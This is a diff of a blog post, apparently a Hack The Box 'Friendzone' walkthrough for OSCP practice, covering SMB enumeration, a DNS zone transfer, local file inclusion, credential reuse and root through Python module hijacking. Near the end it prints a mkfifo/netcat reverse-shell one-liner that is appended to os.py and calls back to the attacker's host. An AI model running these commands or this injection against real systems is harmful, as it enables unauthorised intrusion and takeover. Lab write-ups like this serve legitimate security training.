@@ -3,9 +3,11 @@ title: Friendzone
 date: 2023-01-19 13:30:03 -5000
 categories: [OSCP Prep,HTB Linux Retired]
 tags: [Network,Web,PHP,Source Code Analysis,Authentication,SMB,DNS,Local File Inclusion,Password Reuse,Protocols,Anonymous,Zone Transfer,Sensitive Data Exposure]
+image:
+  path: /Assets/Pictures/Friendzone/resized.webp
+  lqip: data:image/webp;base64,UklGRvgEAABXRUJQVlA4WAoAAAAQAAAAMQAAMQAAQUxQSKIBAAABkHRr27Gt6s/r+fxl29bs0yzbdlPbtm3bNbJt27Zdnx/c4eFZREyAOMIxvGLnDbcTlW3inY1dKkUA4rNdrjZbX+rKtf5yW7vcgH85ul7UlY/6pe654FNI/ZOm8tk81SgUHvBvrmk/VIA/Z+SGt3L7VMD7K8BL7BUV+LV4uIu5pQjvxMEG/5a+qCgvl4VTtu2KdFcO2MkYi0WN1+wqf1K0X6rjn4y7FfG+zBCgVSpTWjsIMh5Q1IcyA9V/cSXWAuYo8vmS7zrbzQJ1frL9qj9a0Y/fzrf7Dt/9T3xf0/h0i0+Z/0ESX8prvncX+K6s4dvQw2Azesd+YPuYkOkw27HMGMA2BKjwmuttJSBkCdfyEAjiPjB9TAAE2nSmWRoggqLXeG4Uwz+Cxt9ZfjSDnWjDDQ5jlOaEDIs4lmaAkyDbKoY12eEKWeenB6UvzAYPiB74OZgvg6PhRaDVPhvEuToCbyLIN/KZX89H5YNbNwKUm3jP8Gben1Qe7l2JAIU6bnyQaDlZiQ83dSoErx5EgNBiDUduOnXn6dO7pzaNalQsDN4BVlA4IDADAACwEQCdASoyADIAPtFYoEwoJSMiLhktUQAaCWwAyQfMSgSSqq2jw3PaTOy213mA84D0tecB1Lu8+vwF0B2iyveFOm/aM3apPNERBa4tdbatqThXkX/pFbuXdjBX9fNgyYbj8YbC+blJtto7nXumCV70GnPJ8yqYce/f56oVqDV88IeCsfrkGZDhV6PLb2qBseQEdyZIhAAA/vnCR2rW8oyvkouH+0gQf2bMU1SR+jV4X68eg3Gjoj+JBpb29FXJnb1YyLk2xZeCr65b9P/7OdzNH/73DhAa4GjTvUuIfmiuICK3fNUkkyc2IjH+X8kpO39eyeHTXgEFjANVBw8VEnMMgeuONXJFqUhl/SN1sa9bXSNT0MOHv5gQupmWV8dV1e0d9yViGKVvGUWA8RkU7cC+8MTHlT8Ic8sShsfmiuwMquKufr/49weA42sejBnXqxB9aUmLu6QKKGpjZBiQ3Ksl7+cLNKDToXoApEscGDqc3AFkPLgr0Q6MP3CxsXV6aNCsTrfpsjwzA+cvyidPY5PHymnPYT0Av95PyijjCUKWA9T+eY1WWhwXbkTnZSQYZTpPq14SdYsw7cgHNVavpRUQv44C2a/fxbTPmBMNI7aJueCApbSdfaMqLXlUfU1qidSXYJu/O+8AjAGi7KFBtxESXHBtRDEN5j1seYM/SQoJa3iab0Si1nDUTxFHGgSV1zuVNfh283WMYOtFWxEsq5NfWUszNtJr6QVLxpTDCg3Qi4r4mVy30eDsnni8hf0Xf3SZOcNrM8QuNIiSoBJZiw4ZsBJM4W0SLlCwdfr/z4A6c1DSoYlX+IcOnZfpg8CAFC0mBbQ8iYdkHY04c8dzSloy4idGZBlPZjlwdjbUmHdUSgNnfaeD+D2xR5z7+tMi8wrSz/EPofnhUEPSFL4mcd3ZGw54xTYkZaT6iF6ANyrv92NlsWr0xW+rCn7B9cmuQDZ/z3ptBr0/XE0sehw+U7xQDP2Dcf/92gtUDPpI0/MIR1kiepJhhLXN3pP1gr8CCA7H17q5eXJksPrVkaSgxtysekRAEmhjC3F/tDwxY3f4TlEFvXjtzmiek66AAAAAAAA=
 ---
-# Friendzone
-![Friendzone.png](/Assets/Pictures/FriendZone.png)
+
 Another HTB machine from TJNull’s list in the easy Linux category. 
 One box a day minimum.
 
@@ -23,6 +25,7 @@ PORT    STATE SERVICE      REASON
 443/tcp open  https        syn-ack ttl 63
 445/tcp open  microsoft-ds syn-ack ttl 63
 ```
+{: .nolineno }
 
 Here are the open and filtered UDP ports on the victim’s machine.
 
@@ -42,6 +45,7 @@ PORT      STATE         SERVICE     REASON
 32815/udp open|filtered unknown     no-response
 57409/udp open|filtered unknown     no-response
 ```
+{: .nolineno }
 
 Let’s look at the service versions of all these ports except SSH port 22.
 
@@ -137,6 +141,7 @@ Host script results:
 |   date: 2023-01-19T09:55:17
 |_  start_date: N/A
 ```
+{: .nolineno }
 
 Now that we are done enumerating the ports, let’s enumerate them individually starting by the lowest hanging fruit. The most juicy one first. SSH is not on the list
 
@@ -157,6 +162,7 @@ SMB is one of the lowest hanging fruit. Let’s enumerate this service. First le
         Development              READ, WRITE     FriendZone Samba Server Files
         IPC$                     NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
 ```
+{: .nolineno }
 
 2 shares caught our attention here, general and development. Because of the permissions we have as anonymous client on this server. Now it’s time to enumerate those disks by login without passwords. we will start with general first.
 
@@ -171,6 +177,7 @@ smb: \> ls
 smb: \> get creds.txt
 getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 ```
+{: .nolineno }
 
 Looking at the creds, we found the administrator password inside of the file.
 
@@ -180,6 +187,7 @@ creds for the admin THING:
 
 admin:WORKWORKHhallelujah@#
 ```
+{: .nolineno }
 
 for now we don’t know where to use those creds yet. But we surely going to keep them. Let’s enumerate the development disk.
 
@@ -192,6 +200,7 @@ smb: \> ls
 
                 3545824 blocks of size 1024. 1651384 blocks available
 ```
+{: .nolineno }
 
 As we can see, this disk is empty so far. Having the write and read permission on it, let’s keep that in mind.
 
@@ -216,6 +225,7 @@ Looking at the port enumeration and this website, we got the hostname of the web
 [sudo] password for retr0x01: 
 10.10.10.123    friendzone.red
 ```
+{: .nolineno }
 
 After adding the hostname, when we visit the website `[http://friendzone.red](http://friendzone.red)` it’s still the same page. But when we access `[https://friendzone.red](https://friendzone.red)` we get a different result.
 
@@ -228,6 +238,7 @@ Looking at the source it hints us that this is probably a rabbit hole. Let’s s
 <!-- /js/js -->
 <!-- Don't go deep ;) -->
 ```
+{: .nolineno }
 
 Since we are enumerating the web, let’s go ahead and get more info by fuzzing the directories first and look for a subdomain. since the port 53 is open. Let’s start with directory busting.
 
@@ -239,12 +250,14 @@ Here is what we found.
 [04:31:17] 200 -   13B  - /robots.txt
 [04:31:27] 200 -  749B  - /wordpress/
 ```
+{: .nolineno }
 
 robots.txt shows the following
 
 ```html
 seriously ?!
 ```
+{: .nolineno }
 
 /wordpress/ shows an empty directory.
 
@@ -281,6 +294,7 @@ friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604
 ;; WHEN: Thu Jan 19 05:51:47 CST 2023
 ;; XFR size: 8 records (messages 1, bytes 289)
 ```
+{: .nolineno }
 
 seems like we found 3 different subdomain of the webserver which are `administrator1.friendzone.red`. Let’s add them to our hostfile and access those pages. Accessing them via HTPP/80 was not successful but accessing them via HTTPS/443 was successful except for `https://hr.friendzone.htb`.
 
@@ -327,6 +341,7 @@ According to the article we need a PHP wrapper in order to be able to read local
 ```bash
 php://filter/convert.base64-encode/resource=<filename>
 ```
+{: .nolineno }
 
 let’s try it.
 
@@ -349,6 +364,7 @@ login                   [Status: 200, Size: 7, Words: 2, Lines: 1]
 dashboard               [Status: 200, Size: 101, Words: 12, Lines: 1]
 timestamp               [Status: 200, Size: 36, Words: 5, Lines: 1]
 ```
+{: .nolineno }
 
 As we can see here, the app is calling the timestamp.php file and read the time for the first time on that file.
 
@@ -363,6 +379,7 @@ We got a long base64 string that contains our source code of the `dahsboard.php`
 ```bash
 ➜  echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 -d > dashboard.php
 ```
+{: .nolineno }
 
 Sadly all this source code doesn’t show where those files are located. Then we remembered that we got smb open. We need to go back since we have a writable directory development, we can upload our reverse shell there and access it with vulnerability.
 
@@ -388,6 +405,7 @@ smbmap -H 10.10.10.123 -R (Recursive)
         fr--r--r--             2585 Thu Jan 19 06:54:42 2023    rev.php
         IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
 ```
+{: .nolineno }
 
 The disk Files leaked the location of all the FriendZone Samba Server Files which is `/etc/Files`.
 
@@ -417,6 +435,7 @@ hostname
 FriendZone
 www-data@FriendZone:/$
 ```
+{: .nolineno }
 
 We were able to get the user flag and found a user on the system, we will need to python as friend, since we are logged in as www-data. In order to do that we will  need to enumerate and gather more information on the box. while enumerating the `/var/www` file seemed to gave some juicy information
 
@@ -441,6 +460,7 @@ db_pass=Agpyu12!0.213$
 
 db_name=FZ
 ```
+{: .nolineno }
 
 We found friend credentials, `friend:Agpyu12!0.213$`.
 
@@ -464,6 +484,7 @@ You have mail.
 Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
 friend@FriendZone:~$
 ```
+{: .nolineno }
 
 Now with a more stable shell, we can enumerate more to look for a way to escalate our privileges to those of the system. Firstly we noticed that friend is not a sudoer. Now let’s look for vulnerable SUID on the machine.
 
@@ -487,6 +508,7 @@ friend@FriendZone:~$ find / -perm -u+s -type f 2>/dev/null
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
 ```
+{: .nolineno }
 
 The SUID technique did not leading to anything serious
 
@@ -505,6 +527,7 @@ friend@FriendZone:/opt/server_admin$ ls -l
 total 4
 -rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
 ```
+{: .nolineno }
 
 With those permission we can read the content of reporter.py
 
@@ -526,6 +549,7 @@ print "[+] Trying to send email to %s"%to_address
 # I need to edit the script later
 # Sam ~ python developer
 ```
+{: .nolineno }
 
 As we can see the code is an unfinished one, but most importantly it’s importing the os module. From this point let’s find the `os.py` file to see the permissions and to see if we can hijack the file and insert a malicious code.
 
@@ -538,6 +562,7 @@ friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python3.6/os.py
 friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
 -rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py (ALL)
 ```
+{: .nolineno }
 
 so we found the file that can be modified and the file we can inject our malicious code `/usr/lib/python2.7/os.py`.
 
@@ -546,6 +571,7 @@ Let’s prepare our injection for a module hijacking.
 ```bash
 friend@FriendZone:/usr/lib/python2.7$ echo "system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.8 9001 >/tmp/f\")" >> os.py
 ```
+{: .nolineno }
 
 With this line in our `os.py` we can just wait and see until the next execution of the cron job. We will wait with our netcat listening to the port `9001`.
 
@@ -563,5 +589,6 @@ root
 10.10.10.123 dead:beef::250:56ff:feb9:9eff 
 uid=0(root) gid=0(root) groups=0(root)
 ```
+{: .nolineno }
 
 Thanks for reading, enjoy and may be the force be with you all !
